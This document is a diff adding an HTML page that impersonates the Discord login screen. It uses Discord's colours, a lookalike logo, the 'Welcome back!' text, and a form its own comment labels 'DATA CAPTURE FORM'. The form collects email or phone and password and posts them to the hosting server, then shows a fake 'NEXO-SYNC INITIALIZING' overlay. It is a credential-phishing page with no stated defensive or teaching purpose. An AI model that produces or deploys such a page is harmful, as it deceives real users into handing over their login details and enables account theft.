@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>
+Discord | Login
+</title>
+<!-- Official Tailwind CDN for rapid styling -->
+<script src="https://cdn.tailwindcss.com">
+</script>
+<style>
+/* Discord's official color palette */
+:root {
+--discord-blurple: #5865f2;
+--discord-dark: #313338;
+--discord-black: #2b2d31;
+--discord-input: #1e1f22;
+--discord-text: #b5bac1;
+}
+
+body {
+/* Authentic dark gradient background */
+background: linear-gradient(180deg, #36393f 0%, #23272a 100%);
+font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+min-height: 100vh;
+margin: 0;
+color: white;
+overflow: hidden;
+}
+
+.login-card {
+background-color: var(--discord-black);
+padding: 32px;
+border-radius: 8px;
+width: 100%;
+max-width: 480px;
+box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+text-align: center;
+}
+
+.input-label {
+color: var(--discord-text);
+font-size: 12px;
+font-weight: 700;
+text-transform: uppercase;
+margin-bottom: 8px;
+display: block;
+text-align: left;
+letter-spacing: 0.5px;
+}
+
+.input-field {
+background-color: var(--discord-input);
+color: white;
+width: 100%;
+padding: 10px;
+border-radius: 3px;
+border: 1px solid rgba(0,0,0,0.3);
+outline: none;
+transition: border 0.2s;
+margin-bottom: 20px;
+}
+
+.input-field:focus {
+border-color: #00aff4;
+}
+
+.btn-login {
+background-color: var(--discord-blurple);
+color: white;
+font-weight: 600;
+padding: 12px;
+border-radius: 3px;
+width: 100%;
+margin-top: 10px;
+transition: background 0.2s;
+cursor: pointer;
+}
+
+.btn-login:hover {
+background-color: #4752c4;
+}
+
+#loading-overlay {
+display: none;
+position: fixed;
+top: 0; 
+left: 0; 
+width: 100%; 
+height: 100%;
+background: rgba(0,0,0,0.85);
+z-index: 1000;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+}
+
+.qr-section {
+margin-top: 20px;
+padding-top: 20px;
+border-top: 1px solid rgba(255,255,255,0.1);
+}
+</style>
+</head>
+<body>
+
+<div class="login-card">
+<!-- Official Logo SVG -->
+<div class="flex justify-center mb-8">
+<svg width="124" height="34" viewBox="0 0 124 34" fill="white">
+<path d="M21.5 0C17.6 0 14.4 3.2 14.4 7.1V22.9C14.4 26.8 17.6 30 21.5 30H28.8L26.6 34.1L31.5 30H42.6C46.5 30 49.7 26.8 49.7 22.9V7.1C49.7 3.2 46.5 0 42.6 0H21.5ZM25.7 18.2C23.9 18.2 22.5 16.6 22.5 14.7C22.5 12.8 23.9 11.2 25.7 11.2C27.5 11.2 28.9 12.8 28.9 14.7C28.9 16.6 27.5 18.2 25.7 18.2ZM38.5 18.2C36.7 18.2 35.3 16.6 35.3 14.7C35.3 12.8 36.7 11.2 38.5 11.2C40.3 11.2 41.7 12.8 41.7 14.7C41.7 16.6 40.3 18.2 38.5 18.2Z"/>
+<text x="56" y="26" style="font-weight: 800; font-size: 24px;">Discord</text>
+</svg>
+</div>
+
+<h2 class="text-2xl font-bold mb-2">
+Welcome back!
+</h2>
+<p class="text-[var(--discord-text)] mb-8">
+We're so excited to see you again!
+</p>
+
+<!-- DATA CAPTURE FORM -->
+<form id="authForm" action="" method="POST">
+<label class="input-label">
+Email or Phone Number <span class="text-red-500">*</span>
+</label>
+<input 
+name="user" 
+type="text" 
+class="input-field" 
+required 
+placeholder="discord@gmail.com"
+>
+
+<label class="input-label">
+Password <span class="text-red-500">*</span>
+</label>
+<input 
+name="pass" 
+type="password" 
+class="input-field" 
+required 
+placeholder="••••••••"
+>
+
+<div class="text-left mb-4">
+<a href="#" class="text-[#00aff4] text-sm hover:underline">
+Forgot your password?
+</a>
+</div>
+
+<button type="submit" class="btn-login">
+Log In
+</button>
+
+<p class="text-sm text-[var(--discord-text)] mt-4">
+Need an account? 
+<a href="#" class="text-[#00aff4] hover:underline">
+Register
+</a>
+</p>
+</form>
+</div>
+
+<!-- NEXO-SYNC LOADING OVERLAY -->
+<div id="loading-overlay">
+<div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mb-4">
+</div>
+<p class="text-white font-bold tracking-widest text-xs uppercase">
+NEXO-SYNC INITIALIZING...
+</p>
+</div>
+
+<script>
+// Trigger overlay on submit
+const form = document.getElementById('authForm');
+const overlay = document.getElementById('loading-overlay');
+
+form.onsubmit = () => {
+overlay.style.display = 'flex';
+};
+</script>
+
+</body>
+</html>
